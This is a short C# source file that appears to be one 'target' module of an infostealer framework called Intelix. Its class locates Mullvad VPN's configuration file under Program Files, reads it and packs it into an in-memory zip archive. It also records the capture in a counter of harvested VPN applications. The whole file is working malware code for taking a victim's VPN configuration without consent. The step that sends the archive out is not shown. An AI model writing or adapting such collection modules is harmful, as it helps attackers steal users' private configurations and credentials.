using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn;

public class MullVad : ITarget
{
	public void Collect(InMemoryZip zip, Counter counter)
	{
		string text = "C:\\Program Files\\Mullvad VPN\\Configs\\Mullvad";
		if (File.Exists(text))
		{
			string text2 = "Mullvad";
			Counter.CounterApplications counterApplications = new Counter.CounterApplications();
			counterApplications.Name = "Mullvad";
			zip.AddFile(Path.Combine(text2, Path.GetFileName(text)), File.ReadAllBytes(text));
			counterApplications.Files.Add(text + " => " + text2);
			counterApplications.Files.Add(text2);
			counter.Vpns.Add(counterApplications);
		}
	}
}
